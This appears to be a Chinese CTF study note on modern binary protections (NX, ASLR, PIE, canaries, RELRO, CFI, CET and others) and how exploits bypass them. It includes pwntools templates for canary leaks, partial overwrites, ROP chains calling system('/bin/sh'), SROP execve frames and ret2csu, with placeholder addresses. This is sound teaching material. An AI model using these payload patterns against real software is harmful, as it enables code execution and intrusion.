# 现代保护机制 (Modern Protections)

## 原理

现代二进制程序启用了多种保护机制（NX/ASLR/PIE/Canary/RELRO/FORTIFY/CFI 等），增加漏洞利用难度。本文件介绍各保护机制及绕过方法。

## 保护机制总览

| 保护 | 全称 | 作用 | 绕过方法 |
|------|------|------|---------|
| NX | No-eXecute | 栈/堆不可执行 | ROP/JOP |
| ASLR | Address Space Layout Randomization | 地址随机化 | 信息泄露 |
| PIE | Position Independent Executable | 可执行文件地址随机化 | 信息泄露 |
| Canary | Stack Canary | 栈溢出检测 | 泄露 canary |
| RELRO | Relocation Read-Only | GOT 只读 | Full RELRO 难绕过 |
| FORTIFY | FORTIFY_SOURCE | 危险函数检查 | 绕过检查 |
| CFI | Control Flow Integrity | 控制流完整性 | 数据导向攻击 |
| CET | Control-flow Enforcement Technology | 硬件级 CFI | 新研究 |
| PAC | Pointer Authentication | ARM 指针认证 | 新研究 |
| MTE | Memory Tagging Extension | ARM 内存标记 | 新研究 |

## 详细说明

### 1. NX (No-eXecute)

```bash
# 检查
checksec ./pwn
# NX enabled

# 绕过：ROP/JOP
# 构造 ROP 链，使用程序/libc 中的代码片段
```

### 2. ASLR (Address Space Layout Randomization)

```bash
# 检查
cat /proc/sys/kernel/randomize_va_space
# 0: 关闭
# 1: 半随机（栈、堆、mmap）
# 2: 全随机（栈、堆、mmap、可执行文件）

# 绕过：信息泄露
# 1. 格式化字符串泄露
# 2. UAF 泄露
# 3. 越界读泄露
```

### 3. PIE (Position Independent Executable)

```bash
# 检查
checksec ./pwn
# PIE enabled

# 绕过：信息泄露
# 1. 泄露程序基址
# 2. partial overwrite（覆盖低字节）
```

### 4. Canary (Stack Canary)

```bash
# 检查
checksec ./pwn
# Canary found

# 绕过：
# 1. 泄露 canary
#    - 格式化字符串
#    - 越界读
# 2. 爆破 canary（fork 服务）
# 3. 覆盖 TLS 中的 __stack_chk_guard
```

```python
# 泄露 canary
from pwn import *

p = process('./pwn')
# 格式化字符串泄露
p.sendline(b'%7$p')  # 假设 canary 在第 7 个参数
canary = int(p.recv(), 16)
# 构造 payload
payload = b'A' * offset
payload += p64(canary)
payload += p64(0)  # saved rbp
payload += p64(ret_addr)
```

### 5. RELRO (Relocation Read-Only)

```bash
# 检查
checksec ./pwn
# No RELRO / Partial RELRO / Full RELRO

# No RELRO: GOT 可写
# Partial RELRO: GOT 部分可写
# Full RELRO: GOT 只读，无法覆盖 GOT

# 绕过 Full RELRO：
# 1. 覆盖 __malloc_hook/__free_hook（glibc < 2.34）
# 2. IO_FILE 攻击
# 3. exit_funcs 攻击
# 4. TLS 攻击
```

### 6. FORTIFY_SOURCE

```bash
# 检查
checksec ./pwn
# FORTIFY_SOURCE

# 绕过：
# 1. 使用不受 FORTIFY 保护的函数
# 2. 绕过长度检查
```

### 7. CFI (Control Flow Integrity)

```bash
# Clang CFI
# GCC CET

# 绕过：
# 1. 数据导向攻击（DOP）
# 2. 不修改控制流，修改数据
# 3. 利用合法的间接调用
```

### 8. CET (Control-flow Enforcement Technology)

```bash
# Intel CET
# 1. 间接分支跟踪（IBT）
# 2. 影子栈（Shadow Stack）

# 绕过：
# 1. 新研究
# 2. 数据导向攻击
```

### 9. PAC (Pointer Authentication)

```bash
# ARM PAC
# 指针签名

# 绕过：
# 1. 签名绕过
# 2. 新研究
```

### 10. MTE (Memory Tagging Extension)

```bash
# ARM MTE
# 内存标记

# 绕过：
# 1. 标记绕过
# 2. 新研究
```

## 绕过技巧

### 1. 信息泄露

```python
# 1. 格式化字符串
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')

# 2. UAF 泄露
fd = u64(read(idx, 8))

# 3. 越界读
data = read(idx, 0x100)  # 读取超过 chunk 大小

# 4. 堆溢出泄露
# 溢出到下一个 chunk，读取其内容
```

### 2. Partial Overwrite

```python
# PIE 开启时，只覆盖低字节
# 低 12 位（3 个十六进制位）固定
# 需要爆破 4 位（1 个十六进制位）

payload = b'A' * offset
payload += p64(canary)
payload += p64(0)  # saved rbp
payload += b'\x34\x12'  # 只覆盖低 2 字节，需要爆破
```

### 3. ROP 链构造

```python
from pwn import *

# 查找 gadget
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))

# 或手动构造
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x401235       # ret
system = 0x401236    # system

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret)  # 对齐
payload += p64(system)
```

### 4. SROP (Sigreturn ROP)

```python
from pwn import *

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 0xf  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = b'A' * offset
payload += p64(sigreturn_addr)
payload += bytes(frame)
```

### 5. Ret2csu

```python
# 利用 __libc_csu_init 中的 gadget
# 控制多个寄存器

# 64 位
# gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

payload = b'A' * offset
payload += p64(gadget1)
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(func_addr)  # r12
payload += p64(arg3)  # r13 -> edi
payload += p64(arg2)  # r14 -> rsi
payload += p64(arg1)  # r15 -> rdx
payload += p64(gadget2)
```

## 2024-2026 新技术点

### 1. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# ARM MTE
# 这些防护增加了利用难度
# 需要新的绕过方法
```

### 2. CFI 绕过

```python
# Clang CFI
# GCC CET
# 数据导向攻击（DOP）
# 利用合法的间接调用
```

### 3. 沙箱绕过

```python
# seccomp
# 通过 ORW (open/read/write) 绕过
# 通过侧信道绕过
# 通过内核漏洞绕过
```

### 4. 新型利用链

```python
# House of Apple/Banana/Cat
# 新的 IO_FILE 利用
# exit_funcs 利用
# TLS 劫持
```

### 5. ARM64/RISC-V

```python
# 非 x86 架构
# 新的保护机制
# 新的利用方法
```

### 6. WASM

```python
# WebAssembly
# 新的保护机制
# 新的利用方法
```

## 工具推荐

- **checksec** — 检查保护机制
- **pwntools** — Python 利用框架
- **ROPgadget** — ROP gadget 查找
- **ropper** — ROP gadget 查找
- **one_gadget** — libc one_gadget
- **seccomp-tools** — seccomp 规则查看

## 参考链接

- [ctf-wiki 保护机制](https://ctf-wiki.org/pwn/linux/mitigation/)
- [checksec](https://github.com/slimm609/checksec.sh)
- [Modern Binary Exploitation](https://github.com/RPISEC/MBE)
- [pwn college](https://pwn.college/)
